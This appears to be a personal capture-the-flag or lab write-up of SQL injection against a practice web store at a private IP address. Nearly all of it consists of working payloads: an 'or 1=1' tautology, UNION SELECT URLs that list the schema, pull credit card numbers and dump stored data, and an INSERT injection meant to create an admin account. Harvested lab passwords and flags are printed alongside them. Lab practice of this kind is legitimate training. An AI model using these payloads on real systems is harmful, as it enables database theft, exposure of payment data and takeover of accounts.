# SQL Injection Writeup

Scheme:
```
>jump
->T1:10.100.28.48
```

## DNLA Category
```
?category=2 or 1=1

flag: { 6CL9mticVauQB80HtxIq }
```

## Tables
```
http://10.100.28.48/cases/productsCategory.php?category=2%20union%20select%20table_name,table_schema,column_name%20from%20information_schema.columns
```

DB: sqlinjection
1. categories
2. members
3. orderlines
4. orders
5. payments
6. permissions
7. products
8. share4

## Admin Credentials

Boss	   8a64QCLqZid5ka2Cc3nr
Maverick   turn&burn
phreak	   pwd
Susan	   flowers99
TW	       imAPlaya
1-2-3-4	   sayULuvM3
rich_kid   1M$
p0pStar	   thrilla
Joe	       vato

## SQL version

```
http://10.100.28.48/cases/productsCategory.php?category=2%20union%20select%201,2,@@version
```

categories	sqlinjection	id
categories	sqlinjection	name
categories	sqlinjection	description
members	sqlinjection	id
members	sqlinjection	username
members	sqlinjection	password
members	sqlinjection	first_name
members	sqlinjection	last_name
members	sqlinjection	email
members	sqlinjection	permission
orderlines	sqlinjection	id
orderlines	sqlinjection	quantity
orderlines	sqlinjection	product
orderlines	sqlinjection	order
orders	sqlinjection	id
orders	sqlinjection	date
orders	sqlinjection	member
payments	sqlinjection	id
payments	sqlinjection	creditcard_number
payments	sqlinjection	date
payments	sqlinjection	order
permissions	sqlinjection	id
permissions	sqlinjection	level
permissions	sqlinjection	name
permissions	sqlinjection	description
products	sqlinjection	id
products	sqlinjection	name
products	sqlinjection	description
products	sqlinjection	price
products	sqlinjection	qty_left
products	sqlinjection	category
share4	sqlinjection	id
share4	sqlinjection	comment
share4	sqlinjection	mime
share4	sqlinjection	data

```
http://10.100.28.48/cases/productsCategory.php?category=2%20union%20select%20id,creditcard_number,3%20from%20sqlinjection.payments
```

## Id Search:

```
http://10.100.28.48/cases/productsCategory.php?category=2%20union%20select%20comment,data,3%20from%20sqlinjection.share4
```

base64:
```
ZHEzY0drazZNZmxLSnh2R25kWGgK ->
dq3cGkk6MflKJxvGndXh
```

## Create Admin

```
firstname=testuser&lastname=testuser&username=testuser&password=testuser&email=testuser&submit=Register
```

Query:
```
INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('testuser', 'testuser', 'testuser', 'testuser', 'testuser', 3)
```

```
10.100.28.48/cases/productsCategory.php?category=2 insert into members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'Hackerson', 'h4cker', 'h4cker', h4cker@example.com', 1)
```

lEsHbAmp3FdKhG6sbDil
